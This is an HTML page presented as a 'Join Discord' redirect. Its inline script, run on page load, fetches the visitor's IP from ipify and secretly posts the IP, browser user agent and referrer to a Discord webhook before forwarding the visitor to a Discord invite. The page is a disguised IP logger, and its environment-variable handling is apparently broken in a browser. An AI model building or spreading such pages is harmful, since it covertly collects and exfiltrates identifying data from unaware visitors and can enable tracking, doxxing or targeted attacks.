<!DOCTYPE html>
<html>
<head>
    <title>Join Discord</title>
    <!-- Load environment variables from .env -->
    <script src="https://cdn.jsdelivr.net/npm/dotenv@16.3.1/lib/main.min.js"></script>
    <script>
        // Load .env variables (for local testing)
        if (window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1") {
            dotenv.config();
        }

        // Get user's IP (works on most hosting platforms)
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip || "Unknown";
            } catch {
                return "Unknown";
            }
        }

        // Send to Discord webhook
        async function logIP() {
            const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || window.DISCORD_WEBHOOK;
            if (!DISCORD_WEBHOOK) {
                console.error("No Discord webhook set!");
                return;
            }

            const ip = await getIP();
            const payload = {
                embeds: [{
                    title: "ðŸ“Œ New Visitor",
                    fields: [
                        { name: "IP", value: ip },
                        { name: "User Agent", value: navigator.userAgent },
                        { name: "Referrer", value: document.referrer || "Direct" }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            fetch(DISCORD_WEBHOOK, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).catch(e => console.error("Failed to log:", e));
        }

        // Run on page load
        logIP().finally(() => {
            window.location.href = "https://discord.gg/k86MEegBrw";
        });
    </script>
</head>
<body>
    <p>Redirecting to Discord...</p>
</body>
</html>
